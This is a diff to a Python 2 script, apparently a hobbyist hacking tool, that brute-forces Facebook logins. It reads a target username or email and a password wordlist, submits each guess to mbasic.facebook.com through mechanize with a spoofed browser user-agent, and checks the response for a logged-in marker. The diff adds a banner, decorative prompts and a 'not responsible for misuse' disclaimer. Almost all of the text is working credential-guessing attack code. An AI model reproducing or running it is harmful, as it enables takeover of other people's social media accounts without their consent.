@@ -19,23 +19,31 @@ try:
     import mechanize
 except ModuleNotFoundError:
     print '[!] Module Please install mechanize and run the program with python2'
+    print """┏━━━┓━━━━━━━━┏┓━━━━━━┏━━━━┓━━━━━━━━
+┗┓┏┓┃━━━━━━━━┃┃━━━━━━┗━━┓━┃━━━━━━━━
+━┃┃┃┃┏━━┓━┏━┓┃┃┏┓━━━━━━┏┛┏┛┏━━┓┏━━┓
+━┃┃┃┃┗━┓┃━┃┏┛┃┗┛┛━━━━━┏┛┏┛━┃┏┓┃┃┏┓┃
+┏┛┗┛┃┃┗┛┗┓┃┃━┃┏┓┓━━━━┏┛━┗━┓┃┃━┫┃┃━┫
+┗━━━┛┗━━━┛┗┛━┗┛┗┛━━━━┗━━━━┛┗━━┛┗━━┛
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     exit()
 
 time.sleep(0.5)
-user = raw_input('[]Target Username/ID/Email >>?? ')
-time.sleep(0.8)
-wrdlstFileName = raw_input('\n[] Wordlist Type Zee.txt  ')
+user = raw_input('[➳]Target Username/ID/Email↳')
+time.sleep(0.5)
+wrdlstFileName = raw_input('➳\n[] Wordlist Type Zee.txt')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
-    print ('\n[!] File Not Found!')
+    print ('➳\n[!] File Not Found!')
     exit()
 
 time.sleep(0.8)
-print '\n\nCracking '+user+' Now...'
+print '➳\n\nCracking'+user+'Now...'
 
 time.sleep(1)
-print '\nIm Not Responsible For Any Missuse Of This Script Z\n'
+print '➳\nIm Not Responsible For Any Missuse Of This Script𒁂Zҽҽ𒁂\n'
 for password in wordlist:
     if password == '' or password == ' ':
         pass
@@ -44,14 +52,14 @@ for password in wordlist:
             browser = mechanize.Browser()
             browser.set_handle_robots(False)
             browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-            fb = browser.open('https://facebook.com')
+            fb = browser.open('https://mbasic.facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
             browser.select_form(nr=0)
             browser.form['email'] = user
             browser.form['pass'] = password
             browser.method = 'POST'
             browser.submit()
-            dos.write(browser.open('https://facebook.com').read())
+            dos.write(browser.open('https://mbasic.facebook.com').read())
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
